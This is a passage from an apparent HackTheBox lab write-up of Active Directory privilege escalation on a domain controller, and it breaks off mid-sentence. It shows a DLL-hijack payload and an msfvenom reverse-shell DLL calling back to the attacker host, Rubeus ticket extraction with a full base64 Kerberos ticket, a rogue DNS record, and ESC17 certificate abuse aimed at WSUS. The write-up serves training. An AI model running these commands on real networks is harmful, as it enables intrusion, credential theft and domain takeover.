+[*] Connecting to &#39;dc01.logging.htb:5985&#39; as &#39;msa_health$&#39;
+evil-winrm-py PS C:\Users\msa_health$\Documents&gt; whoami
+logging\msa_health$
+evil-winrm-py PS C:\Users\msa_health$\Documents&gt;</code></pre><p>I now have a shell on the domain controller</p><h2><code>UpdateChecker</code> LPE leads to compromise of <code>jaylee.clifton</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Users\msa_health$\Documents&gt; type monitor.ps1
+&lt;#
+.SYNOPSIS
+    Monitors the status of the &quot;UpdateChecker Agent&quot; scheduled task.
+    Uses COM interface to avoid CIM/WMI permission issues.
+#&gt;
+
+$TaskName = &quot;UpdateChecker Agent&quot;
+$LogPath = &quot;C:\Share\Logs\TaskMonitor.log&quot;
+$Timestamp = Get-Date -Format &quot;yyyy-MM-dd HH:mm:ss&quot;
+
+try {
+    $service = New-Object -ComObject &quot;Schedule.Service&quot;
+    $service.Connect()
+    $task = $service.GetFolder(&quot;\&quot;).GetTask($TaskName)
+
+    $State = switch ($task.State) {
+        1 { &quot;Disabled&quot; }
+        2 { &quot;Queued&quot; }
+        3 { &quot;Ready&quot; }
+        4 { &quot;Running&quot; }
+        5 { &quot;Disabled&quot; }
+        6 { &quot;Unknown&quot; }
+        default { &quot;Unknown&quot; }
+    }
+
+    if ($State -ne &quot;Ready&quot; -and $State -ne &quot;Running&quot;) {
+        $Message = &quot;[$Timestamp] WARN  - Task [$TaskName] is in an unexpected state: $State&quot;
+    }
+    else {
+        $Message = &quot;[$Timestamp] INFO  - Task [$TaskName] health check: OK (State: $State)&quot;
+    }
+}
+catch {
+    $Message = &quot;[$Timestamp] ERROR - Failed to query task [$TaskName]. Exception: $($_.Exception.Message)&quot;
+}
+
+Add-Content -Path $LogPath -Value $Message
+evil-winrm-py PS C:\Users\msa_health$\Documents&gt;</code></pre><p>This looks like its running a scheduled task</p><p>Ill have a look around the filesystem to see where this <code>UpdateChecker</code> could be running from</p><p>It looks like theres more info in <code>programdata</code></p><p>But it looks the .exe itself is in <code>Program Files</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\ProgramData\UpdateMonitor\Logs&gt; type monitor.log
+[2026-04-16 16:41:18] Starting Sentinel Update Check...
+[2026-04-16 16:41:18] Checking for update on core server...
+[2026-04-16 16:41:18] Info: Core did not find file Settings_Update.zip
+[2026-04-16 16:41:18] Last status: File not found on core
+[2026-04-16 16:41:18] Checking for update on local server...
+[2026-04-16 16:41:18] No updates found locally: C:\ProgramData\UpdateMonitor\Settings_Update.zip.
+[2026-04-16 16:41:18] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
+[2026-04-16 16:41:18] Failed to load settings_update.dll. Error code: 126
+[2026-04-16 16:41:18] Update check completed.
+
+...[SNIP]...</code></pre><p>So it looks like the service is trying to load a .zip file and a .dll file from the filesystem, these files dont currently exist, but its possible i can make a malicious one</p><p><code>ProgramData</code> is writable by any user too</p><p>So after some research i see it basically loads a .zip from the path in the snippet above, it then unzips the file and placed the dll into the bin directory and loads it, so there is a potential for DLL hijacking here</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ cat settings_update.cpp 
+#include &lt;windows.h&gt;
+#include &lt;stdlib.h&gt;
+
+// This ensures the compiler exports the exact name without mangling
+extern &quot;C&quot; {
+    __declspec(dllexport) void PreUpdateCheck() {
+        // Your code execution payload goes here
+        // Example: Spawning a command or reverse shell
+        system(&quot;&lt;powershell base64 encoded reverse shell&gt;&quot;);
+    }
+}
+
+// Optional but good practice for stability
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+        case DLL_PROCESS_ATTACH:
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+            break;
+    }
+    return TRUE;
+}</code></pre><p>Ill get a powershell reverse shell from revshells.com then place it in the code</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ x86_64-w64-mingw32-g++ -shared -o settings_update.dll settings_update.cpp -lwinmm</code></pre><p>Ill then compile the code into the DLL</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ zip Settings_Update.zip settings_update.dll 
+adding: settings_update.dll (deflated 65%)</code></pre><p>Then ill zip the DLL</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ penelope -p 1337                                        
+[+] Listening for reverse shells on 0.0.0.0:1337 -&gt; 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)</code></pre><p>Ill then start a listener</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\ProgramData\UpdateMonitor&gt; upload Settings_Update.zip .
+Uploading /home/kali/htb/logging/Settings_Update.zip: 100%|█████████████| 30.5k/30.5k [00:00&lt;00:00, 70.3kB/s]
+[+] File uploaded successfully as: C:\ProgramData\UpdateMonitor\Settings_Update.zip
+evil-winrm-py PS C:\ProgramData\UpdateMonitor</code></pre><p>Then ill upload the .zip to the correct dir like it says in the logs</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">[2026-10-06 18:41:15] Update failed: Access to the path &#39;C:\ProgramData\UpdateMonitor\Settings_Update.zip&#39; is denied.</code></pre><p>After waiting a few minutes and getting nothing i check the logs and see that there is a different error, this tells me it detected the zip file but had no access over it so it couldnt unzip it, this tells me this service is not running as the administrator, because the administrator would have full control over the file and be able to unzip it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\ProgramData\UpdateMonitor&gt; icacls &quot;C:\ProgramData\UpdateMonitor\Settings_Update.zip&quot; /grant Everyone:F
+processed file: C:\ProgramData\UpdateMonitor\Settings_Update.zip
+Successfully processed 1 files; Failed processing 0 files
+evil-winrm-py PS C:\ProgramData\UpdateMonitor&gt;</code></pre><p>Ill then just grant every user full control over it, so whoever this service runs as can unzip it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">[2026-10-06 18:50:15] Starting Sentinel Update Check...
+[2026-10-06 18:50:15] Checking for update on core server...
+[2026-10-06 18:50:15] Info: Core did not find file Settings_Update.zip
+[2026-10-06 18:50:15] Last status: File not found on core
+[2026-10-06 18:50:15] Checking for update on local server...
+[2026-10-06 18:50:15] Successfully unzipped update to C:\Program Files\UpdateMonitor\bin\
+[2026-10-06 18:50:15] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
+[2026-10-06 18:50:15] Failed to load settings_update.dll. Error code: 193
+[2026-10-06 18:50:15] Update check completed.</code></pre><p>Then ill wait a few more minutes and i see this in the logs, this time it managed to extract the file but still did not execute</p><p>After researching this error, it looks like it means it needs to compiled for a 32-bit system</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">i686-w64-mingw32-g++ -shared -o settings_update.dll settings_update.cpp</code></pre><p>Ill just recompile the code to make the 32-bit DLL, then ill rezip it once again</p><p>But there is still nothing, ill try just using a msfvenom DLL as well</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.61 LPORT=1337 -f dll -a x86 -o settings_update.dll 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of dll file: 9216 bytes
+Saved as: settings_update.dll</code></pre><p>Ill make the payload</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ zip Settings_Update.zip settings_update.dll
+  adding: settings_update.dll (deflated 80%)</code></pre><p>Ill rezip it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\ProgramData\UpdateMonitor&gt; upload Settings_Update.zip .
+Uploading /home/kali/htb/logging/Settings_Update.zip: 100%|█████████████| 1.96k/1.96k [00:00&lt;00:00, 32.6kB/s]
+[+] File uploaded successfully as: C:\ProgramData\UpdateMonitor\Settings_Update.zip
+evil-winrm-py PS C:\ProgramData\UpdateMonitor&gt; icacls &quot;C:\ProgramData\UpdateMonitor\Settings_Update.zip&quot; /grant Everyone:F
+processed file: C:\ProgramData\UpdateMonitor\Settings_Update.zip
+Successfully processed 1 files; Failed processing 0 files
+evil-winrm-py PS C:\ProgramData\UpdateMonitor&gt;</code></pre><p>Ill upload it and grant all users full control over the file so it can be unzipped</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ penelope -p 1337
+[+] Listening for reverse shells on 0.0.0.0:1337 -&gt; 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] =&gt; DC01 10.129.245.130 Microsoft_Windows_Server_2019_Standard-x64-based_PC 👤 logging\jaylee.clifton 😍️ Session ID &lt;1&gt;
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/DC01~10.129.245.130-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_10_06-20_23_18-149.log
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+C:\Windows\system32&gt;whoami
+whoami
+logging\jaylee.clifton
+
+C:\Windows\system32&gt;</code></pre><p>Then after a few minutes i get a connection back</p><h2>Enumeration as <code>jaylee.clifton</code></h2><p>Bloodhound categorizes this user as a tier zero operator</p><p><img src="images/logging/pasted-image-20261006203346.webp" alt="Screenshot" loading="lazy" /></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Users\jaylee.clifton\Documents\Tickets&gt; dir
+dir
+
+
+    Directory: C:\Users\jaylee.clifton\Documents\Tickets
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        4/16/2026   7:27 PM           2453 Incident_4922_WSUS_Remediation_ViewExport.html                        
+
+
+PS C:\Users\jaylee.clifton\Documents\Tickets&gt; </code></pre><p>There is an interesting html page here</p><p>Ill move this to programdata so i can get it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Users\jaylee.clifton\Documents\Tickets&gt; cp Incident_4922_WSUS_Remediation_ViewExport.html C:\ProgramData\
+cp Incident_4922_WSUS_Remediation_ViewExport.html C:\ProgramData\
+
+PS C:\Users\jaylee.clifton\Documents\Tickets&gt; icacls &quot;C:\ProgramData\Incident_4922_WSUS_Remediation_ViewExport.html /grant Everyone:F
+icacls &quot;C:\ProgramData\Incident_4922_WSUS_Remediation_ViewExport.html&quot; /grant Everyone:F
+processed file: C:\ProgramData\Incident_4922_WSUS_Remediation_ViewExport.html
+Successfully processed 1 files; Failed processing 0 files
+PS C:\Users\jaylee.clifton\Documents\Tickets&gt; </code></pre><p>Ill copy the file over then give everyone full control over it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\ProgramData&gt; download Incident_4922_WSUS_Remediation_ViewExport.html .
+Downloading C:\ProgramData\Incident_4922_WSUS_Remediation_ViewExport.html: 64.0kB [00:00, 1.33GB/s]          
+[+] File downloaded successfully and saved as: /home/kali/htb/logging/Incident_4922_WSUS_Remediation_ViewExport.html</code></pre><p>Then using my evil-winrm session i can download the file</p><p><img src="images/logging/pasted-image-20261006205010.webp" alt="Screenshot" loading="lazy" /></p><p>I dont have the credentials for <code>jaylee.clifton</code> as of yet, there is the option to get rubeus on the system then use it to get a ticket</p><h2>Uploading Rubeus to get a valid TGT as <code>jaylee.clifton</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\ProgramData&gt; upload Rubeus.exe .
+Uploading /home/kali/htb/logging/Rubeus.exe: 512kB [00:01, 458kB/s]                                          
+[+] File uploaded successfully as: C:\ProgramData\Rubeus.exe
+
+evil-winrm-py PS C:\ProgramData&gt; icacls &quot;C:\ProgramData\Rubeus.exe&quot; /grant Everyone:F
+processed file: C:\ProgramData\Rubeus.exe
+Successfully processed 1 files; Failed processing 0 files</code></pre><p>Ill upload rubeus and grant all users full control over the file, ill upload using my winrm session to make the upload process easier</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\ProgramData&gt; .\Rubeus.exe tgtdeleg /nowrap
+.\Rubeus.exe tgtdeleg /nowrap
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3 
+
+
+[*] Action: Request Fake Delegation TGT (current user)
+
+[*] No target SPN specified, attempting to build &#39;cifs/dc.domain.com&#39;
+[*] Initializing Kerberos GSS-API w/ fake delegation for target &#39;cifs/DC01.logging.htb&#39;
+[+] Kerberos GSS-API initialization success!
+[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
+[*] Found the AP-REQ delegation ticket in the GSS-API output.
+[*] Authenticator etype: aes256_cts_hmac_sha1
+[*] Extracted the service ticket session key from the ticket cache: HUraAe+aHynqrgYBuqeoR1/YbkHtOg2lF4BA4ndFAt0=
+[+] Successfully decrypted the authenticator
+[*] base64(ticket.kirbi):
+
+      doIFyDCCBcSgAwIBBaEDAgEWooIEyjCCBMZhggTCMIIEvqADAgEFoQ0bC0xPR0dJTkcuSFRCoiAwHqADAgECoRcwFRsGa3JidGd0GwtMT0dHSU5HLkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRuYGHDTJ4vu0s+4IgneDmeEAMxAWNPmsJeaQNHU2QkmUGqmksj6B7rvW5qNV+gocNpok5KWIcBlA70+ntnEzhAPZUrAX/seP2jv8zeJwg6qDZaAOGq8pTnuDdQw178/szf2Qxixqv/BZ9zkLBEakNvvjDthqLt0KubASH/mijSXHMQfBARA+05rF9t/43XzsaWNGxjqpdvFsV8No8MP8AaiREjQMNE55DwIhOppP7HGtPK9BulO/GhY8CLw2ESWMSyFVlaypKVC4bNI+nhnFEwM/opb/H2y//t41xw0NDTVWHVnUMkuVGlQ68PqHvZx2CdeIwzWDP6k55oG/qLVsqW2ObNAyxrVhWOMS47e0i+7YAXiEtM8s8C2H3D5lOloW+zSI/6tv4tyKDGPqDqaIT70tIus5pqhAYIPBrVywr53PE2khGzua5AaHi7NOrKH2cPAxYtIYTEMZbXfM+GgH5CEzSYTFu4rM2P33J5hUBdkkdVJ608ImYBzCeE4LJff+B0NJrm5TVHuf/dQLSk6+jlQHnifpVEJOzPYBYSjEHURa6hi9jt+lMxrQ5qn/9gIA4ib4A+pgghYlyMXrDSRVzlZEI0e4n8/vug+KK0e8po8WhshuMKkbjTWTQXMePLXeJu7tbQ+GwOHdkhlCFipFDwHSQ788ik72zr6M49PhaAZfeoWDJp/4ASwaHHi9vOcSbx5mdPgXOrLDbL0R//BdAss1RIb+DXmKUFUYihd0XjAywQfmRI4G8GhZccVMy/ERdXNABHjkXv9bK0B0R5R71kR0FRoeiWmezZ8fnZFf36U9Ey5fvUAEZmnX4JbFz2zxVyYPnNrIALYdpwbrIJNA1jsvKcI2zg1YVBUNvDPuo8qWwKhYVLc/Bym3qUIZvF6gswK/5/AvLuEj/I0LPcin0XqTLzVyODzpWEAMiw0wfJKjrWhq1wP0OIFQJ2nrL97k3STTSdRwdN8poI4G5j2BBXkqlTixbHBjyiLCp2KNGoEFEpNPpH34W7Sr2Qmi01EZ37VyG12NanR5EdLLi6lizk6MvsfvG42xGpD+g0cJ0QHtXEid3qDxWvHcZzu1dJLiOXjN+OWSTgDCQ6a7SPWJj6tHvOZtLh5otej/ppQbs+uO6cOo6v2SEmUIww/VLt6MxFXuU54ExB/FwGK7xQOKcpdZwZoagGTmX7VB0648oBTYGCmk8QDzPB1/MX7fV12MgxJWDmkHQP15sMbQfdRTEhuQwXCrzWQ0KP/xxb+C6NLhRUoN6XPbrrGTjUY2iFkyTD+e++yH2BQonkBbSvpdoetEnbpjMaHhTTLXY48xLkTDnF5fan62KLq5wMEzV2nOYPOxkODeh+lxhWP1KhTCBLiFYluAHkjPNGfUtyFwPcU/HQpfHVw/lS1Lqrg9GOxs6kgS7mIU6OZBE9dmG0Fyw25aIpf9xnyddqoBicB7PmpSZXLJnn4KhQM3O5vrK28SoO1N7e2SNUgD6NYiqI590atqMY1oddYG4lGQkpGMs5o4HpMIHmoAMCAQCigd4Egdt9gdgwgdWggdIwgc8wgcygKzApoAMCARKhIgQgdh3yxUoFzDwbW1vRe2oFXRGTIut4/78fwAoRH8YeY6ihDRsLTE9HR0lORy5IVEKiGzAZoAMCAQGhEjAQGw5qYXlsZWUuY2xpZnRvbqMHAwUAYKEAAKURGA8yMDI2MTAwODAwMDMwMFqmERgPMjAyNjEwMDgwOTU5MTVapxEYDzIwMjYxMDE0MjM1OTE1WqgNGwtMT0dHSU5HLkhUQqkgMB6gAwIBAqEXMBUbBmtyYnRndBsLTE9HR0lORy5IVEI=
+PS C:\ProgramData&gt; </code></pre><p>I now have the base64 encoded kirbi</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ echo &#39;doIFyDCCBcSgAwIBBaEDAgEWooIEyjCCBMZhggTCMIIEvqADAgEFoQ0bC0xPR0dJTkcuSFRCoiAwHqADAgECoRcwFRsGa3JidGd0GwtMT0dHSU5HLkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRuYGHDTJ4vu0s+4IgneDmeEAMxAWNPmsJeaQNHU2QkmUGqmksj6B7rvW5qNV+gocNpok5KWIcBlA70+ntnEzhAPZUrAX/seP2jv8zeJwg6qDZaAOGq8pTnuDdQw178/szf2Qxixqv/BZ9zkLBEakNvvjDthqLt0KubASH/mijSXHMQfBARA+05rF9t/43XzsaWNGxjqpdvFsV8No8MP8AaiREjQMNE55DwIhOppP7HGtPK9BulO/GhY8CLw2ESWMSyFVlaypKVC4bNI+nhnFEwM/opb/H2y//t41xw0NDTVWHVnUMkuVGlQ68PqHvZx2CdeIwzWDP6k55oG/qLVsqW2ObNAyxrVhWOMS47e0i+7YAXiEtM8s8C2H3D5lOloW+zSI/6tv4tyKDGPqDqaIT70tIus5pqhAYIPBrVywr53PE2khGzua5AaHi7NOrKH2cPAxYtIYTEMZbXfM+GgH5CEzSYTFu4rM2P33J5hUBdkkdVJ608ImYBzCeE4LJff+B0NJrm5TVHuf/dQLSk6+jlQHnifpVEJOzPYBYSjEHURa6hi9jt+lMxrQ5qn/9gIA4ib4A+pgghYlyMXrDSRVzlZEI0e4n8/vug+KK0e8po8WhshuMKkbjTWTQXMePLXeJu7tbQ+GwOHdkhlCFipFDwHSQ788ik72zr6M49PhaAZfeoWDJp/4ASwaHHi9vOcSbx5mdPgXOrLDbL0R//BdAss1RIb+DXmKUFUYihd0XjAywQfmRI4G8GhZccVMy/ERdXNABHjkXv9bK0B0R5R71kR0FRoeiWmezZ8fnZFf36U9Ey5fvUAEZmnX4JbFz2zxVyYPnNrIALYdpwbrIJNA1jsvKcI2zg1YVBUNvDPuo8qWwKhYVLc/Bym3qUIZvF6gswK/5/AvLuEj/I0LPcin0XqTLzVyODzpWEAMiw0wfJKjrWhq1wP0OIFQJ2nrL97k3STTSdRwdN8poI4G5j2BBXkqlTixbHBjyiLCp2KNGoEFEpNPpH34W7Sr2Qmi01EZ37VyG12NanR5EdLLi6lizk6MvsfvG42xGpD+g0cJ0QHtXEid3qDxWvHcZzu1dJLiOXjN+OWSTgDCQ6a7SPWJj6tHvOZtLh5otej/ppQbs+uO6cOo6v2SEmUIww/VLt6MxFXuU54ExB/FwGK7xQOKcpdZwZoagGTmX7VB0648oBTYGCmk8QDzPB1/MX7fV12MgxJWDmkHQP15sMbQfdRTEhuQwXCrzWQ0KP/xxb+C6NLhRUoN6XPbrrGTjUY2iFkyTD+e++yH2BQonkBbSvpdoetEnbpjMaHhTTLXY48xLkTDnF5fan62KLq5wMEzV2nOYPOxkODeh+lxhWP1KhTCBLiFYluAHkjPNGfUtyFwPcU/HQpfHVw/lS1Lqrg9GOxs6kgS7mIU6OZBE9dmG0Fyw25aIpf9xnyddqoBicB7PmpSZXLJnn4KhQM3O5vrK28SoO1N7e2SNUgD6NYiqI590atqMY1oddYG4lGQkpGMs5o4HpMIHmoAMCAQCigd4Egdt9gdgwgdWggdIwgc8wgcygKzApoAMCARKhIgQgdh3yxUoFzDwbW1vRe2oFXRGTIut4/78fwAoRH8YeY6ihDRsLTE9HR0lORy5IVEKiGzAZoAMCAQGhEjAQGw5qYXlsZWUuY2xpZnRvbqMHAwUAYKEAAKURGA8yMDI2MTAwODAwMDMwMFqmERgPMjAyNjEwMDgwOTU5MTVapxEYDzIwMjYxMDE0MjM1OTE1WqgNGwtMT0dHSU5HLkhUQqkgMB6gAwIBAqEXMBUbBmtyYnRndBsLTE9HR0lORy5IVEI=&#39; | base64 -d | tee jaylee.clifton.kirbi</code></pre><p>Ill decode it then place the output in a file</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ ticketConverter.py jaylee.clifton.kirbi jaylee.clifton.ccache
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] converting kirbi to ccache...
+[+] done</code></pre><p>Then ill convert it to a valid ccache</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +7h nxc smb dc01.logging.htb --use-kcache
+SMB         dc01.logging.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.logging.htb 445    DC01             [+] LOGGING.HTB\jaylee.clifton from ccache</code></pre><p>And now using this ticket i can auth as this user</p><h2>ADCS enumeration</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +7h certipy-ad find -u &#39;jaylee.clifton@logging.htb&#39; -k -no-pass -dc-host dc01.logging.htb -dc-ip 10.129.245.130 -target-ip 10.129.245.130 -target dc01.logging.htb -stdout -enabled -vulnerable
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 15 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for &#39;logging-DC01-CA&#39; via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for &#39;logging-DC01-CA&#39;
+[*] Checking web enrollment for CA &#39;logging-DC01-CA&#39; @ &#39;DC01.logging.htb&#39;
+[!] Error checking web enrollment: [Errno 111] Connection refused
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : logging-DC01-CA
+    DNS Name                            : DC01.logging.htb
+    Certificate Subject                 : CN=logging-DC01-CA, DC=logging, DC=htb
+    Certificate Serial Number           : 1E4F7EC9F5F17EA34E246D856D6C0C83
+    Certificate Validity Start          : 2026-04-24 16:40:56+00:00
+    Certificate Validity End            : 2126-04-24 16:50:56+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : LOGGING.HTB\Administrators
+      Access Rights
+        ManageCa                        : LOGGING.HTB\Administrators
+                                          LOGGING.HTB\Domain Admins
+                                          LOGGING.HTB\Enterprise Admins
+        ManageCertificates              : LOGGING.HTB\Administrators
+                                          LOGGING.HTB\Domain Admins
+                                          LOGGING.HTB\Enterprise Admins
+        Enroll                          : LOGGING.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : UpdateSrv
+    Display Name                        : UpdateSrv
+    Certificate Authorities             : logging-DC01-CA
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Extended Key Usage                  : Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 10 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2026-04-17T00:41:06+00:00
+    Template Last Modified              : 2026-04-17T00:41:07+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : LOGGING.HTB\IT
+                                          LOGGING.HTB\Domain Admins
+                                          LOGGING.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : LOGGING.HTB\Administrator
+        Full Control Principals         : LOGGING.HTB\Domain Admins
+                                          LOGGING.HTB\Enterprise Admins
+        Write Owner Principals          : LOGGING.HTB\Domain Admins
+                                          LOGGING.HTB\Enterprise Admins
+        Write Dacl Principals           : LOGGING.HTB\Domain Admins
+                                          LOGGING.HTB\Enterprise Admins
+        Write Property Enroll           : LOGGING.HTB\Domain Admins
+                                          LOGGING.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : LOGGING.HTB\IT
+    [!] Vulnerabilities
+      ESC17                             : Enrollee supplies subject and template allows server authentication.
+    [*] Remarks
+      ESC17                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.</code></pre><h2>ESC17 and WSUS exploitation leads to SYSTEM command execution</h2><p><a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc17-enrollee-supplied-subject-for-server-authentication" target="_blank" rel="noreferrer">https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc17-enrollee-supplied-subject-for-server-authentication</a></p><p>Ill use the wiki to guide me here</p><p>According to the wiki, its common to combine the WSUS service with ESC17, in this intsance there is a WSUS install as seen from nmap earlier</p><p>But according to the wiki it involves the wsus services in the request in the format <code>wsus.corp.local</code></p><p>And if i query dns using bloodyADs <code>get dnsDump</code> i can see the record doesnt exist</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ bloodyAD --host dc01.logging.htb -d logging.htb -k add dnsRecord wsus 10.10.14.61 
+Clock skew detected. Adjusting local time by 6:59:59.340585. Retrying operation.
+[+] wsus has been successfully added</code></pre><p>First ill add the record with my IP address on it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ faketime -f +7h certipy-ad req \
+    -u &#39;jaylee.clifton@logging.htb&#39; -k -no-pass \
+    -dc-ip &#39;10.129.245.130&#39; -target &#39;dc01.logging.htb&#39; \
+    -ca &#39;logging-DC01-CA&#39; -template &#39;UpdateSrv&#39; \
+    -dns &#39;wsus.logging.htb&#39;
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
+[*] Requesting certificate via RPC
+[*] Request ID is 15
+[*] Successfully requested certificate
+[*] Got certificate with DNS Host Name &#39;wsus.logging.htb&#39;
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to &#39;wsus.pfx&#39;
+[*] Wrote certificate and private key to &#39;wsus.pfx&#39;</code></pre><p>Ill then request the pfx cert</p><p><a href="https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wsus" target="_blank" rel="noreferrer">https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wsus</a></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\ProgramData&gt; reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
+
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
+    WUServer    REG_SZ    https://wsus.logging.htb:8531
+
+evil-winrm-py PS C:\ProgramData&gt;
+
+evil-winrm-py PS C:\ProgramData&gt; Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name &quot;usewuserver&quot;
+
+
+UseWUServer  : 1
+PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate\
+               au
+PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
+PSChildName  : au
+PSDrive      : HKLM
+PSProvider   : Microsoft.PowerShell.Core\Registry
+
+
+
+evil-winrm-py PS C:\ProgramData&gt;</code></pre><p>Using my winrm session i can see that the service is running on HTTPS, i can also see this when i open a http web server on port 8531 i get encrypted responses</p><p>From here there is two ways to exploit this, one is to abuse WSUS and NTLM relay or with WSUS code execution</p><p><a href="https://blog.digitrace.de/2026/01/using-adcs-to-attack-https-enabled-wsus-clients/#extending-wsus-attacks-to-https" target="_blank" rel="noreferrer">https://blog.digitrace.de/2026/01/using-adcs-to-attack-https-enabled-wsus-clients/#extending-wsus-attacks-to-https</a></p><p>Im going to attempt to use the code execuction method using wsuks</p><p><a href="https://github.com/NeffIsBack/wsuks" target="_blank" rel="noreferrer">https://github.com/NeffIsBack/wsuks</a></p><p>Ill use the wsuks tool to do this just like the above digitrace article</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">❯❯❯ openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes --passin pass:</code></pre><p>Then 